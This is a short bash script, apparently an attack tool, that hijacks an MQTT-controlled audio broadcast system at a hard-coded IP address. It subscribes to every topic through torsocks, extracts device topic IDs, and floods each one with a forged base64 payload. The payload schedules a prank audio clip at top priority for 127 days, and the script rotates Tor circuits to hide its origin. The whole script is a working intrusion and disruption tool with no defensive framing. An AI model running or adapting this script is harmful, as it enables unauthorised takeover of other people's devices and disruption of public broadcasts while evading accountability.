#!/bin/bash
# HIJACK_ALL_VOV.sh - Auto-capture live topics + Peppe overwrite (Torsocks rotation)

HOST="42.1.64.56"
PORT=1883
PEPPe_URL="https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"
PAYLOAD='[{"id":51886,"show_id":51886,"show_info":"eyJtaWQiOjUxODg2LCJwcmlvIjo5OTk5LCJzdW1tYXJ5IjoiUEVQUEUgQlJFU0NJQSBQT0VUWSAyNEg3IiwibW9kZSI6MSwicmVwZWF0IjoxLCJkYXlzIjoxMjcsImZpbGVzIjpbeyJpZCI6MCwidHlwZSI6MywidXJsIjoiaHR0cHM6Ly90dHRtLm1vYmlmb25lLnZuL3VwbG9hZEZpbGUvaGVhZGVyL2hlYWRlci53YXYifSx7ImlkIjo1MTg4NiwidHlwZSI6MSwic2l6ZSI6MzAwMDAsImR1cmF0aW9uIjozMCwidXJsIjoi'"$PEPPe_URL"'In19","action":1,"version":51886}]'

# Torsocks rotation
rotate_torsocks() {
  CIRCUIT=$((RANDOM % 10 + 1))
  torsocks -C $CIRCUIT mosquitto_pub -h $HOST -p $PORT -t "$1" -m "$PAYLOAD" >/dev/null 2>&1
}

echo "🔥 LIVE HIJACK START - Ctrl+C to stop"
torsocks mosquitto_sub -h $HOST -p $PORT -t '#' | while read line; do
  # Estrai topic da messaggio MQTT (es. 88171961791382520:d:16)
  topic=$(echo "$line" | grep -o '[0-9]\{17\}:[sd]:[0-9]\+' | head -1)
  if [[ $topic ]]; then
    echo "ID=$topic HIJACKED"
    # Triple overwrite con rotation
    rotate_torsocks "$topic"
    sleep 0.1
    rotate_torsocks "$topic"
    sleep 0.1
    rotate_torsocks "$topic"
  fi
done
